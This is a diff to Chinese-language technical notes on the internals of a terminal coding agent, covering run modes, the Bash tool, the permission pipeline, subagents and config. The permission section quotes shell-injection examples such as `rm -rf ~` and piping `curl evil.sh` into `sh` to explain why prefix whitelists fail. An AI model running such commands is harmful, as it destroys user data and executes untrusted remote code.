@@ -1,5 +1,6 @@
 ---
 title: "Yukino Code — 技术笔记"
+description: "围绕 apps/yukino 终端 Coding Agent 实现细节的 104 组深度问答"
 ---
 
 > 本机器路径 `$HOME/github/yukino-code/apps/yukino`
@@ -17,14 +18,14 @@ Yukino 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 架构上分为六层:
 
-1. 入口分发层 (`src/main.tsx`) : 根据 CLI 参数分发到四种模式 —— TUI (默认, Ink/React 交互界面) 、print (`-p` 管道模式, 支持 `text`/`stream-json` 输出) 、remote (Koa + WebSocket 的浏览器 UI) 、teammate (子进程后台代理) .
+1. 入口分发层 (`src/main.tsx`) : 根据 CLI 参数按序分发到六种运行模式 (main.tsx:39-49) —— acp (`--acp` / `--acp-ws`, Agent Client Protocol 适配) 、a2a (`--a2a [host:port]`, Agent-to-Agent 协议服务端) 、teammate (子进程后台代理) 、remote (Koa + WebSocket 的浏览器 UI) 、print (`-p` 管道模式, 支持 `text`/`stream-json` 输出) 、TUI (默认, Ink/React 交互界面) .
 2. Agent 循环层 (`src/agent/index.ts`) : 核心是一个 `async *run(): AsyncGenerator<AgentEvent>` 生成器, 把"思考-行动"循环抽象为事件流.
 3. LLM 抽象层 (`src/llm/`) : 统一 `LLMClient` 接口 (`stream()` + `setSystemPrompt()`) , 适配 anthropic / openai / openai-compat 三种协议.
 4. 工具层 (`src/tools/`) : 统一 `Tool` 接口 (`schema()` + `execute()`) , 按 `category: read | write | command` 分类, 支撑并行调度与权限决策.
 5. 表现层 (`src/ui/`) : Ink (React for CLI) 渲染, `app.tsx` (约 3000 行) 作为编排者消费 AgentEvent 流.
 6. 横切支撑层: 权限 (`permissions/`) 、上下文压缩 (`compact/`) 、会话持久化 (`session/`) 、记忆 (`memory/`) 、钩子 (`hooks/`) 、MCP、技能、多智能体 (`subagent/`、`teams/`) .
 
-关键设计洞察: 四种运行模式消费的是同一个 AgentEvent 流, Agent 核心对 UI 完全无感知 —— 这是"表现层与领域层彻底解耦"的体现.
+关键设计洞察: 各运行模式消费的是同一个 AgentEvent 流, Agent 核心对 UI 完全无感知 —— 这是"表现层与领域层彻底解耦"的体现.
 
 ---
 
@@ -43,21 +44,22 @@ Yukino 是一个运行在终端中的 Coding Agent, 本质区别不在于"CLI", 
 
 ### 项目中 AgentEvent 是如何建模的? 为什么用 discriminated union 而不是类继承?
 
-`src/agent/events.ts` 定义了 12 个成员的判别联合 (discriminated union) :
+`src/agent/events.ts` 定义了 13 个成员的判别联合 (discriminated union) :
 
-| 事件                            | 载荷                                         | 语义                                 |
-| ------------------------------- | -------------------------------------------- | ------------------------------------ |
-| `stream_text` / `thinking_text` | `text`                                       | 正文/思考增量                        |
-| `thinking_complete`             | `thinking, signature`                        | 思考块完成 (签名用于 Anthropic 回传) |
-| `tool_use`                      | `toolName, toolId, args`                     | 工具调用开始                         |
-| `tool_result`                   | `toolName, toolId, output, isError, elapsed` | 工具执行结果                         |
-| `turn_complete`                 | —                                            | 一轮 (一次 LLM 响应+工具执行) 结束   |
-| `loop_complete`                 | `stopReason`                                 | 整个 Agent 循环结束                  |
-| `usage`                         | `UsageInfo`                                  | token 用量                           |
-| `error`                         | `Error`                                      | 错误                                 |
-| `compact`                       | `message, boundary?`                         | 发生了上下文压缩                     |
-| `retry`                         | `reason, delay`                              | 自我恢复重试                         |
-| `permission_request`            | `toolName, args`                             | 权限询问 (透传给 UI)                 |
+| 事件                            | 载荷                                         | 语义                                                                          |
+| ------------------------------- | -------------------------------------------- | ----------------------------------------------------------------------------- |
+| `stream_text` / `thinking_text` | `text`                                       | 正文/思考增量                                                                 |
+| `thinking_complete`             | `thinking, signature`                        | 思考块完成 (签名用于 Anthropic 回传)                                          |
+| `tool_use`                      | `toolName, toolId, args`                     | 工具调用开始                                                                  |
+| `tool_result`                   | `toolName, toolId, output, isError, elapsed` | 工具执行结果                                                                  |
+| `turn_complete`                 | —                                            | 一轮 (一次 LLM 响应+工具执行) 结束                                            |
+| `loop_complete`                 | `stopReason`                                 | 整个 Agent 循环结束                                                           |
+| `steering_delivered`            | `text`                                       | 排队的 steering 消息已在轮次边界 (工具结果之后、下一次 LLM 调用之前) 注入对话 |
+| `usage`                         | `UsageInfo`                                  | token 用量                                                                    |
+| `error`                         | `Error`                                      | 错误                                                                          |
+| `compact`                       | `message, boundary?`                         | 发生了上下文压缩                                                              |
+| `retry`                         | `reason, delay`                              | 自我恢复重试                                                                  |
+| `permission_request`            | `toolName, args`                             | 权限询问 (透传给 UI)                                                          |
 
 选 discriminated union 而非类继承的原因:
 
@@ -110,22 +112,24 @@ Ink 的核心价值是把声明式 UI 和组件化心智模型带进终端, 而 
 1. 可组合性: 不同运行模式 (TUI / print / subagent) 可以裁剪不同段落组合, 例如子代理可注入 `systemPromptOverride` 完全替换.
 2. 可测试性: 每个 section 是独立纯函数, 可单测.
 3. 缓存友好: Anthropic 客户端在系统提示词上打 `cache_control: { type: "ephemeral" }` 断点 (`anthropic.ts:372`) , 系统提示词整体稳定不变才能命中 prompt cache —— 如果把易变内容 (如日期) 混在正文里会破坏缓存, 所以日期等信息放在靠后的 Environment 段, 且会话内不变.
-4. 身份保护: Identity 段 (sections.ts:29-39) 只定义 "You are Yukino..." 身份与安全禁令, 并不含"不得提及 Claude/Anthropic/OpenAI"的约束 —— 该约束仅出现在 remote 模式初始化时注入的 "IDENTITY OVERRIDE" system-reminder (server.ts:419, 见「IDENTITY OVERRIDE 与系统提示词 Identity 段的关系」) , 是按宿主定制的运行时强化而非系统提示词内容.
+4. 身份保护: Identity 段 (sections.ts:7-13) 只定义 "You are Yukino..." 一句身份声明 (安全禁令在 System 段的 `# Context` 里) . 旧版 remote 模式初始化时注入的 "IDENTITY OVERRIDE" system-reminder (要求不得提及 Claude/Anthropic/OpenAI 等) 在当前代码中已删除, 全仓无匹配 —— 身份约束现在只来自系统提示词.
 
 ---
 
-### Yukino 的四种运行模式 (TUI / print / remote / teammate) 如何复用同一套核心逻辑? 这种设计对可测试性有什么意义?
+### Yukino 的六种运行模式 (TUI / print / remote / teammate / ACP / A2A) 如何复用同一套核心逻辑? 这种设计对可测试性有什么意义?
 
 复用的关键是 Agent 核心只依赖注入的接口, 不依赖宿主环境:
 
-```
+```text
 main.tsx ──┬── TUI      → Ink <App>, 消费 AgentEvent → React state
            ├── print    → parsePrintFlags → 消费 AgentEvent → stdout (text/stream-json)
            ├── remote   → Koa + WebSocket, 消费 AgentEvent → 广播给浏览器 React 前端
-           └── teammate → 子进程, 消费 AgentEvent → 写文件邮箱/进度文件
+           ├── teammate → 子进程, 消费 AgentEvent → 写文件邮箱/进度文件
+           ├── acp      → --acp/--acp-ws, 消费 AgentEvent → agentEventToUpdate 转 ACP 会话更新
+           └── a2a      → --a2a, 消费 AgentEvent → agentEventToMessage 转 A2A 消息推送
 ```
 
-四个宿主共享: `Agent` (循环) 、`ConversationManager` (消息历史) 、`ToolRegistry` (工具) 、`PermissionChecker` (权限) 、`compact` (压缩) 、`session` (持久化) . 宿主只负责三件事: 构造依赖 (依赖注入) 、消费事件流、处理人机交互 (权限确认、提问) .
+各宿主共享: `Agent` (循环) 、`ConversationManager` (消息历史) 、`ToolRegistry` (工具) 、`PermissionChecker` (权限) 、`compact` (压缩) 、`session` (持久化) . 宿主只负责三件事: 构造依赖 (依赖注入) 、消费事件流、处理人机交互 (权限确认、提问) .
 
 对可测试性的意义:
 
@@ -207,7 +211,7 @@ Yukino 有三类自愈机制, 都在 `agent.ts` 中:
 3. max_tokens 截断 → 输出上限升级 + 多轮续写
 
 - Phase 1 (升级) : 首次 `stop_reason === "max_tokens"` 时, 把输出上限提升到 `MAX_TOKENS_CEILING = 64000`, 把已生成的部分文本作为 assistant 消息落历史, 追加用户消息"从断点直接继续", 立即重试.
-- Phase 2 (多轮恢复) : 若升级后仍截断, 最多再做 `MAX_OUTPUT_TOKENS_RECOVERIES = 3` 轮续写, 提示词改为"把剩余工作拆成更小的块". 任何非 max_tokens 的停止原因都会重置计数器.
+- Phase 2 (多轮恢复) : 若升级后仍截断, 最多再做 `MAX_TOKENS_RECOVERIES = 3` 轮续写, 提示词改为"把剩余工作拆成更小的块". 任何非 max_tokens 的停止原因都会重置计数器.
 
 三类都是资源/瞬态问题, 用"修正上下文后重试"恢复. 另一类相关机制是未知工具的处理 (`streaming-executor.ts:65-76`) : 模型幻觉出不存在的工具名时, 执行器不做任何计数或熔断, 只是返回一条 `Error: unknown tool 'xxx'` 错误结果 (源码注释写明 "let the model self-correct with another tool; keep the loop running") , 让模型看到错误后自行纠正 —— 循环照常继续.
 
@@ -358,7 +362,7 @@ Anthropic API 要求消息严格 user/assistant 交替 —— 连续两条同角
 
 `llm/errors.ts` 定义了继承体系:
 
-```
+```text
 LLMError
 ├── AuthenticationError   (401)
 ├── RateLimitError        (429, 携带 retryAfter)
@@ -394,7 +398,7 @@ recordUsageAnchor(input, output, cacheRead, cacheCreation) {
 
 每次 LLM 响应返回真实 `usage` 后记录锚点: `baselineTokens` 是当时全部历史的真实 token 数, `_anchorCount` 是当时的历史长度. 之后的估算 (`compact.ts:232` `currentContextTokens()`) :
 
-```
+```text
 currentTokens = baselineTokens + estimateMessages(history.slice(anchorCount))
               = 真实值 + 增量部分的字符估算
 ```
@@ -511,23 +515,23 @@ interface Tool {
 
 ### Bash 工具是如何执行命令的? 为什么必须用异步 API 而不是同步?
 
-`tools/bash.ts` 用异步 `execFile("bash", ["-c", command], { timeout, killSignal: "SIGTERM", maxBuffer: 10MB })` 包在 Promise 里执行. 源码注释记录了这段演进史: 最初用同步执行, 结果在整条命令执行期间 TUI 冻结 (spinner 动画、elapsed 计时器、键盘输入全部卡死) ; 换成异步执行后 Node 事件循环保持空闲, UI 才能继续响应.
+`tools/bash.ts` 用异步 `spawn(prepared.executable, prepared.args, { cwd, detached: true, env, stdio: ["ignore", fd, fd] })` 执行 (bash.ts:330-338) : 每条命令先用 `createShellOutputFile` 开一个临时输出文件, 子进程的 stdout+stderr 以文件描述符模式直写该文件, 输出不经过 JS 内存. 源码注释记录了这段演进史: 最初用 `spawnSync` 同步执行, 结果在整条命令执行期间 TUI 冻结 (spinner 动画、elapsed 计时器、键盘输入全部卡死) ; 换成异步 spawn 后 Node 事件循环保持空闲, UI 才能继续响应 (bash.ts:308-311) .
 
 异步是必然选择的原因:
 
 1. TUI 由事件循环驱动: Ink 渲染、定时器 (spinner 动画、elapsed 计时) 、`useInput` 键盘事件都依赖事件循环空闲. 同步 API 阻塞主线程, 任何耗时稍长的命令都会让整屏冻结;
 2. 工具执行模型本就是 await 语义: Agent 在 `await tool.execute(...)` 处等待结果, 异步只是让出事件循环 —— 逻辑上同样阻塞, 但等待期间 UI 事件照常处理;
-3. 上层并行批仍然有效: 并行批 `Promise.all` 下多个 execFile 子进程真正并发执行, 同步 API 则会让并行批退化为串行.
+3. 上层并行批仍然有效: 并行批 `Promise.all` 下多个 spawn 子进程真正并发执行, 同步 API 则会让并行批退化为串行.
 
-超时与输出处理:
+超时、中断与输出处理:
 
-- timeout: 由 Node 内核实现, 到时用 `killSignal: "SIGTERM"` 强杀子进程. 默认 120s, 硬上限 `MAX_TIMEOUT = 600` 秒;
-- abortSignal: `ctx.abortSignal` 接入 execFile 的 `signal`, 用户按 Esc 可中断子进程 (AbortError → "Error: command interrupted") ;
-- `maxBuffer: 10MB` 是最后防线: 超限则子进程被杀、截断后的输出照常返回; 真正的体积控制在上层 (agent 层单结果超 `MAX_OUTPUT_CHARS = 50000` 落盘、budget 层管聚合, 见「上下文管理的两道防线」) ;
-- stdout/stderr 分别捕获后拼接 (不加前缀, 避免污染模型对输出的解析) ;
-- 非零退出码附加语义提示 (`exitCodeHint()`) : 如 grep 退出码 1 提示"no matches found"、diff 退出码 1 提示"files differ" —— 把 Unix 退出码惯例翻译成模型能理解的自然语言, 避免模型把"无匹配"误判为"命令失败"而反复重试.
+- timeout: 不用 spawn 内建选项, 而是手动计时器 (`setTimeout(timeout * 1000)`) , 到时调 `terminate()` —— 先 `killTree("SIGTERM")` 对整个进程组 (`detached: true` 使子进程自成进程组, `process.kill(-pid)` 整组杀) 发 SIGTERM, `KILL_GRACE_MS = 3000`ms 后未退出则升级 SIGKILL (bash.ts:365-390, 429-437) . 不用内建 timeout/killSignal 的原因写在注释里: 那只会 SIGTERM 直接子进程, 会派生子进程的命令 (dev server、npm scripts) 或捕获 SIGTERM 的命令会活着不走、回调永不触发, 把 Agent 循环卡死、Esc 像失效一样 (bash.ts:312-318) . 默认 120s, 硬上限 `MAX_TIMEOUT = 600` 秒; 超时时若允许自动后台化, 命令会先被转入后台任务而不是直接杀;
+- abortSignal: `ctx.abortSignal` 的 abort 同样走 `terminate()` 路径, 用户按 Esc 可中断整棵进程树 (提前 abort 则直接返回 "Error: command interrupted") ;
+- 输出体积看门狗: 子进程直写输出文件、写路径上没有 JS, 所以用 `setInterval` 轮询 `statSync` 体积兜底 —— 前台上限 `MAX_SHELL_OUTPUT_BYTES = 10MB` (后台化后放宽到 5GB) , 超限即 `terminate()` 杀进程组、读回截断后的输出照常返回 (bash.ts:392-411) ; 真正的体积控制在上层 (agent 层单结果超 `MAX_OUTPUT_CHARS = 50000` 落盘、budget 层管聚合, 见「上下文管理的两道防线」) ;
+- stdout/stderr 共享同一个输出 fd (POSIX 上以 `O_APPEND` 打开保证原子写, 两流按时间交错) ; 命令结束后 `readOutputFile` 按上限读回 (带 truncated 标记) 、删除临时文件再组装最终结果 (bash.ts:480-498) ;
+- 非零退出码附加语义提示 (`exitCodeHint()`, `tools/exit-code-hints.ts`, 经 `formatFinalResult` 组装) : 如 grep 退出码 1 提示"no matches found"、diff 退出码 1 提示"files differ" —— 把 Unix 退出码惯例翻译成模型能理解的自然语言, 避免模型把"无匹配"误判为"命令失败"而反复重试.
 
-沙箱包装在执行前: `if (sandbox?.available()) actualCommand = sandbox.wrap(command, config)` —— 见「OS 级沙箱的实现」.
+沙箱在执行前准备: `sandbox.prepare(command, config, ctx)` 产出 `PreparedSandboxCommand` ({executable, args, env}), spawn 直接执行它 (无沙箱时即 `{ executable: "bash", args: ["-c", command] }`) ; 准备时还会把输出文件所在目录追加进 allowWrite, 供 bind 型沙箱挂载 (bash.ts:210-257) —— 见「OS 级沙箱的实现」.
 
 ---
 
@@ -535,14 +539,14 @@ interface Tool {
 
 ### 权限检查器 (PermissionChecker) 的分层决策管线是怎样的? 请按优先级逐层说明.
 
-`permissions/checker.ts` 的 `check()` 是一条短路求值的分层管线, 靠前的层更具体、更优先:
+`permissions/index.ts` 的 `check()` 是一条短路求值的分层管线, 靠前的层更具体、更优先:
 
 - Layer 0 — plan 模式计划文件例外: mode 为 `plan` 且目标是 WriteFile/EditFile 且 `file_path` 含 `.yukino/plans/` → 直接 allow. 让模型在只读的计划模式下也能写计划文件, 是"模式约束内的合法出口".
 - Layer 2 — 只读命令白名单: command 类工具过 `isSafeCommand()` (见「isSafeCommand 的元字符守卫」) , 命中 → allow.
-- Layer 3 — 危险命令黑名单: `detectDangerous()` 检查 `DANGEROUS_PATTERNS`, 命中 → 直接 deny, 不问用户 —— 有些操作连"用户误点允许"的风险都不能冒. 值得注意现状: 源码中该模式数组当前为空 (checker.ts:59 "Keep it empty array", rm -rf、fork 炸弹等旧模式已整体注释掉, checker.ts:61-79) , 即这一层目前不会命中任何命令, 机制保留但规则集清空.
+- Layer 3 — 危险命令黑名单: `detectDangerous()` 检查 `DANGEROUS_PATTERNS`, 命中 → 直接 deny, 不问用户 —— 有些操作连"用户误点允许"的风险都不能冒. 值得注意现状: 源码中该模式数组当前为空 (index.ts:38-41, 注释明言 Layer-3 deny 在补充模式之前保持失活; rm -rf、fork 炸弹等旧模式已整体移除) , 即这一层目前不会命中任何命令, 机制保留但规则集清空.
 - Layer 3.5 — 沙箱自动放行: OS 沙箱可用且工具为 Bash 时, 把复合命令按 `&&`/`||`/`;`/`|` 拆分为子命令逐个过规则引擎 —— 任一 deny 则整体 deny、有 ask 则整体 ask, 否则 allow. 命令将在内核级隔离中运行, 即使恶意也伤不到宿主, HITL 询问无增量价值.
-- Layer 4 — 路径沙箱 (PathSandbox) : 文件类工具限定在项目目录 + os.tmpdir 内; 项目内的 `.yukino/config.yaml`、`.yukino/permissions.local.yaml`、`.yukino/skills/` 在拒绝写名单 (`DEFAULT_DENY_WRITE`, checker.ts:125-129) → deny.
-- Layer 4b — "allow always" 规则: 用户点"不再询问"后, `allowAlways()` (`checker.ts:548-571`) 把授权转为一条 scoped 规则并持久化 —— 文件类工具按"父目录 + `/*`", 命令类按"前 1-2 个词 + `*`" (即整个命令族) , 经 `ruleEngine.appendLocalRule()` (`checker.ts:347-367`) 写入项目本地规则 YAML (同 `Tool(pattern)` 格式、去重) . 该规则下次检查经 Layer 5 的规则引擎命中 → allow, 且跨会话重启仍然生效.
+- Layer 4 — 路径沙箱 (PathSandbox) : 文件类工具限定在项目目录 + os.tmpdir 内; 拒写名单 (`DEFAULT_DENY_WRITE`, permissions/index.ts:241) 当前为空数组 —— 旧版列入的 `.yukino/config.yaml`、`.yukino/permissions.local.yaml`、`.yukino/skills/` 条目已移除, 机制保留但名单清空 (与 Layer 3 的 `DANGEROUS_PATTERNS` 同一处理方式) , 即这一层目前不会对任何路径命中 deny-write.
+- Layer 4b — "allow always" 规则: 用户点"不再询问"后, `allowAlways()` (`index.ts:734-759`) 把授权转为一条 scoped 规则并持久化 —— 文件类工具按"父目录 + `/*`", 命令类按"前 1-2 个词 + `*`" (即整个命令族) , 经 `ruleEngine.appendProjectRule()` (`index.ts:488-510`) 写入项目本地规则 YAML (同 `Tool(pattern)` 格式、去重) . 该规则下次检查经 Layer 5 的规则引擎命中 → allow, 且跨会话重启仍然生效.
 - Layer 5 — YAML 规则引擎 (RuleEngine) : 用户/项目/本地三级 YAML 规则文件, `ToolName(pattern)` 形式的 glob 规则 → 按规则 allow/deny/ask. 规则文件按 mtime+size 缓存, 文件变化后下一次检查即读到新规则, 改规则立即生效.
 - Layer 6 — 模式矩阵兜底 (`modeDecide()`) : `default` (read 放行, write/command 询问) 、`acceptEdits` (write 放行, command 询问) 、`plan` (write/command 均询问) 、`bypassPermissions` (全放行) .
 
@@ -554,7 +558,7 @@ interface Tool {
 
 朴素方案是"命令前缀白名单": `ls`、`cat`、`git status` 等开头即放行. 但这有经典注入漏洞 —— `cat /etc/passwd; rm -rf ~` 以 `cat` 开头却执行任意命令; `ls $(curl evil.sh | sh)` 同理.
 
-`isSafeCommand()` (`checker.ts:380`) 因此是两阶段检查:
+`isSafeCommand()` (`index.ts:524`) 因此是两阶段检查:
 
 1. 元字符守卫: 先扫描整条命令, 含 `>`、`|`、`;`、`&&`、`$(`、反引号 任一即直接判定"不安全" (不是拒绝, 而是交还给后续权限层询问) . 这些 shell 元字符能把"安全前缀"变成任意执行的跳板.
 2. 前缀匹配: 过了守卫的命令, 再与只读命令前缀表匹配 (`ls`、`cat`、`git status`、`git log` 等) , 命中才自动放行.
@@ -839,7 +843,7 @@ if (!scheduled) {
 
 触发阈值 (`computeCompactThreshold()`) :
 
-```
+```text
 effectiveWindow = contextWindow - min(maxOutput, SUMMARY_OUTPUT_RESERVE=20000)
 autoThreshold   = effectiveWindow - 13000    (自动触发)
 hardBlock       = effectiveWindow - 3000     (强制触发, 无视熔断器)
@@ -1037,11 +1041,11 @@ JSONL (每行一条 JSON, 纯追加) 的优势在该场景下非常契合:
 
 - `general-purpose`: 全权限, 处理复杂多步任务;
 - `plan`: 禁 Edit/Write + plan 权限模式 —— 只读架构师, 产出实施计划;
-- `explore`: 禁 Edit/Write + plan 模式 + `model: "haiku"` —— 用便宜模型做代码探索, 是成本分层设计: 探索类任务 token 消耗大但智力要求低, 用弱模型省钱.
+- `explore`: 禁 Edit/Write + plan 模式 + `model: "deepseek-flash"` (definition.ts:40) —— 用便宜快速模型做代码探索, 是成本分层设计: 探索类任务 token 消耗大但智力要求低, 用便宜模型省钱.
 
 派生层 (`spawn.ts`) : `spawnSubagent()` 为子代理创建全新 `ConversationManager` (隔离上下文, 防污染主线) ; 模型解析优先级 `调用方覆盖 > 定义指定 > 父级模型`, 模型不同时新建 LLMClient 否则复用父客户端; `maxIterations = maxTurns ?? 200`; `onProgress` 回调向 UI 汇报 turn/lastTool.
 
-工具过滤 (`tool-filter.ts`, 源码注释标明六层) : MCP 工具 (`mcp__*` 前缀) 始终放行 → 全局黑名单 `SUBAGENT_DISALLOWED_TOOLS` (ExitPlanMode/Agent/AskUserQuestion/TaskStop, 防子代理再派生子代理失控) → 自定义代理附加黑名单 (当前与全局相同, 为扩展性单列) → 异步 (后台) 代理白名单 → 定义级黑名单 → 定义级白名单 (`["*"]` 除外) .
+工具过滤 (`tool-filter.ts`, 源码注释标明五层) : MCP 工具 (`mcp__*` 前缀) 豁免第 2、3 层全局过滤, 但仍受第 4、5 层定义级黑/白名单约束 → 全局黑名单 `SUBAGENT_DISALLOWED_TOOLS` (ComputerUse/AskUserQuestion/ExitPlanMode 三个主线程专属工具, 外加 Agent/TaskStop —— 防子代理再派生子代理失控、抢占主线程 UI 单例) → 异步 (后台) 代理白名单 `ASYNC_AGENT_ALLOWED_TOOLS` (14 个工具, 含 WebFetch) → 定义级黑名单 `disallowedTools` → 定义级白名单 `tools` (`["*"]` 表示禁用此层) .
 
 防递归 fork: fork 路径 (继承父上下文运行) 有双重检测 —— `querySource` 标记 + 扫描对话中的 `<fork_boilerplate>` 标签; fork 出的代理拿到的是克隆注册表 (`cloneRegistryForFork()` 把 Agent 工具深拷贝并打上 fork 标记) , 使其再次 fork 时能被识别并拒绝.
 
@@ -1077,18 +1081,19 @@ inline 模式 (`executor.ts`) : 技能正文替换 `$ARGUMENTS` 占位符 (或�
 
 fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 控制父上下文继承量: `none` (默认, 完全隔离) / `recent` (带父对话最近 5 条) / `full` (最近 100 条) . 适合会产生大量中间输出的任务 (如"批量重构"—— 中间过程不进主线污染上下文, 只回传最终报告) .
 
-目录扫描顺序 (`catalog.ts:61-68`, 6 个目录, 后者覆盖同名前者) :
+目录扫描顺序 (`catalog.ts:38-46, 91-95`, 2 个目录, 后者覆盖同名前者) :
 
-```
-~/.claude/skills → ~/.github/skills → ~/.yukino/skills
-→ {project}/.claude/skills → {project}/.github/skills → {project}/.yukino/skills
+```text
+~/.agents/skills → {project}/.agents/skills
 ```
 
 设计意图:
 
-1. 内置 < 用户 < 项目: 越靠近当前项目的配置优先级越高, 与 Git/ESLint 的配置级联惯例一致;
-2. 兼容生态: 扫描 `.claude`/`.github` 目录意味着可直接复用 Claude Code 等生态的已有技能库 —— 降低用户迁移成本, 是务实的生态策略;
+1. 用户 < 项目: 越靠近当前项目的配置优先级越高 (项目目录后扫描, `entries.set` 同名覆盖) , 与 Git/ESLint 的配置级联惯例一致;
+2. 生态约定: 目录名取自 `.agents` 生态约定 (代码里以 ecosystem 数组表达, 当前仅 `.agents` 一项, 预留扩展) —— 跨工具共享同一份技能库;
 3. 覆盖语义: 同名覆盖而非合并, 简单可预测.
+
+当前代码没有 built-in 层, 仓库本身也不附带 SKILL.md —— 用户级与项目级是仅有的两层.
 
 热重载: `get()` 比对文件 mtime, 变了就重读重解析 (失败保留旧版) ; `needsReload()` 靠目录 mtime 感知增删 —— 技能开发时可即改即试. 技能还被注册为斜杠命令 (`/<name>`) , 且模型可通过 `LoadSkillTool` 自主激活 —— 人驱与模型驱两个入口.
 
@@ -1115,14 +1120,14 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ### 对比"子代理 fork / 技能 fork / 团队 teammate"三种并发形态, 各自的适用场景与设计取舍是什么?
 
-| 维度     | 子代理 (Agent tool)       | 技能 fork                      | 团队 teammate                     |
-| -------- | ------------------------- | ------------------------------ | --------------------------------- |
-| 触发者   | 模型自主决策              | 用户 `/skill` 或模型 LoadSkill | 模型调 TeamCreate/SpawnTeammate   |
-| 上下文   | 全新 (或 fork 继承)       | 全新 + fork_context 控制       | 全新                              |
-| 生命周期 | 一次性, 跑完即返          | 一次性                         | 长驻, idle 后等新任务             |
-| 通信     | 返回值 (最终报告)         | 返回值                         | 文件邮箱双向持续通信              |
-| 模型     | 可指定 (explore 用 haiku) | 可指定                         | 与 lead 相同                      |
-| 适用场景 | 独立子任务 (探索/计划)    | 流程化 SOP 的隔离执行          | 长周期并行工作流 (前后端同时开发) |
+| 维度     | 子代理 (Agent tool)                | 技能 fork                      | 团队 teammate                     |
+| -------- | ---------------------------------- | ------------------------------ | --------------------------------- |
+| 触发者   | 模型自主决策                       | 用户 `/skill` 或模型 LoadSkill | 模型调 TeamCreate/SpawnTeammate   |
+| 上下文   | 全新 (或 fork 继承)                | 全新 + fork_context 控制       | 全新                              |
+| 生命周期 | 一次性, 跑完即返                   | 一次性                         | 长驻, idle 后等新任务             |
+| 通信     | 返回值 (最终报告)                  | 返回值                         | 文件邮箱双向持续通信              |
+| 模型     | 可指定 (explore 用 deepseek-flash) | 可指定                         | 与 lead 相同                      |
+| 适用场景 | 独立子任务 (探索/计划)             | 流程化 SOP 的隔离执行          | 长周期并行工作流 (前后端同时开发) |
 
 取舍分析:
 
@@ -1151,42 +1156,32 @@ fork 模式: 技能在隔离子代理中运行, 自带上下文, `fork_context` 
 
 ---
 
-### 配置系统的多层合并策略是什么? context window 的四级解析体现什么设计思想?
+### 配置系统的加载策略是什么? context window 的解析体现什么设计思想?
 
-合并 (`config.ts`, `loadConfig()` 的 3 个候选文件按序叠加, config.ts:449-453) : `~/.yukino/config.yaml` → `{cwd}/.yukino/config.yaml` → `{cwd}/.yukino/config.local.yaml`. 合并规则按字段类型定制:
+加载 (`config/index.ts`, `loadConfig()`, index.ts:428-456) : 当前实现**没有多文件级联合并** —— 只读全局单文件 `~/.yukino/config.yaml` (`globalConfigPath()`, provider-config.ts:15-17) , 缺失即抛 `ConfigError` (例外: `allowEmptyProviders` 时返回空配置) ; 也可显式传 `path` 加载指定文件. 项目级定制只保留了 MCP 一个入口: `withProjectMcpServers(config, workDir)` (index.ts:410-426) 读取 `{workDir}/.mcp.json` (Claude Code 兼容格式, `mcpServers` 记录条目) , 把其中的 server 追加进 `mcp_servers` —— 同名 server 以用户级 config.yaml 优先 (项目文件随仓库分发, 信任度低于用户自己的配置) ; 单个无效条目被跳过并记日志, 损坏的项目配置不会阻塞启动 (index.ts:363-402) .
 
-- `providers`: 整体替换 (数组无合并语义, 整体覆盖最不惊讶) ;
-- `mcp_servers`: 按 name 合并 (同名替换, 新名追加 —— 有键集合用键合并) ;
-- `hooks`: 拼接 (无键可合并, 叠加最安全) ;
-- `sandbox`: 浅合并; `permission_mode`: 后者覆盖; `enable_coordinator_mode`: OR.
+体现了"配置单一事实源 + 项目级窄入口": providers/hooks/sandbox 等全局行为只由用户全局文件定义, 避免仓库文件覆盖用户的凭证与权限造成意外; 项目差异只允许 MCP server 这类低风险的增量, 且信任分级用"同名用户级优先"落地.
 
-体现了"按数据结构选择合并语义": 标量覆盖、数组替换、有键映射按键合并、无键列表拼接 —— 与 Helm values、Kubernetes strategic merge patch 同理. `local` 文件用于不入库的本地覆盖 (API key 等敏感信息) .
+context window 解析 (`getContextWindow()`, provider-config.ts:258-263) : 只有两级 —— 显式配置 `context_window` (正整数才生效, 用户最懂, 最高优先) , 否则回退 `DEFAULT_CONTEXT_WINDOW = 1_000_000`. 纯同步读取配置, 无 API 探测、无模型名猜测. `getMaxOutputTokens()` (provider-config.ts:271-278) 同理: 配置值优先, 否则 `DEFAULT_MAX_OUTPUT_TOKENS = 128_000`, 且钳制不超过 context window —— 避免给小输出模型传过大的 max_tokens. 启动早期用 `withProviderDefaults()` 一次性补齐 thinking/context_window/max_output_tokens 三个字段的生效值.
 
-context window 四级解析 (`getContextWindowAsync()`) :
-
-1. 显式配置 `context_window` (用户最懂, 最高优先) ;
-2. API 探测: Anthropic 协议查 `GET /v1/models/{model}` 的 `max_input_tokens` (3s 超时 + 缓存, best-effort) ;
-3. 内置模型名子串表 (`gpt-4.1→1M`、`claude→200K`、`gpt-3.5→16385`…) ;
-4. 保守默认: claude 系 200K, 其余 128K.
-
-设计思想是"准确性与可用性的优雅降级链": 每层失败都回落到更保守但永远可用的下一层, 任何环境下都能启动 —— 只是压缩阈值保守一点. 同时同步版 `getContextWindow()` (无 API 层) 供启动早期使用, 异步版就绪后升级 —— 同一数据的"快路径/准路径"双版本.
+设计思想是"准确性与简单性的取舍": 与其维护多级合并与探测链, 不如单一文件 + 显式声明 + 保守默认 —— 任何环境下都能启动, 只是默认窗口取 1M 兜底, 压缩阈值随配置精确.
 
 ---
 
-### 项目的测试策略是怎样的? 100 个测试文件覆盖了哪些关键面? E2E 怎么做?
+### 项目的测试策略是怎样的? 110 个测试文件覆盖了哪些关键面? E2E 怎么做?
 
-Vitest v4 (v8 coverage) , 测试分层 (`tests/`, 100 个测试文件) :
+Vitest v4 (v8 coverage) , 测试分层 (`tests/`, 110 个测试文件) :
 
 单元层:
 
-- 协议转换: `anthropic-context.test.ts`、`openai-compat.test.ts` (消息构造、错误分类、缓存去重) ;
+- 协议转换: `openai-compat.test.ts` (消息构造、错误分类、缓存去重) ;
 - 核心算法: `compact.test.ts` (阈值/保留尾部/PTL) 、`conversation.test.ts`、`tool-result.test.ts` (budget) 、`diff.test.ts`、`at-expand.test.ts`;
 - 安全: `permissions.test.ts` (分层决策、元字符守卫、规则引擎) ;
-- 基础设施: `config.test.ts`、`session.test.ts`、`model-resolver.test.ts`.
+- 基础设施: `config.test.ts`、`session.test.ts`、`history.test.ts`.
 
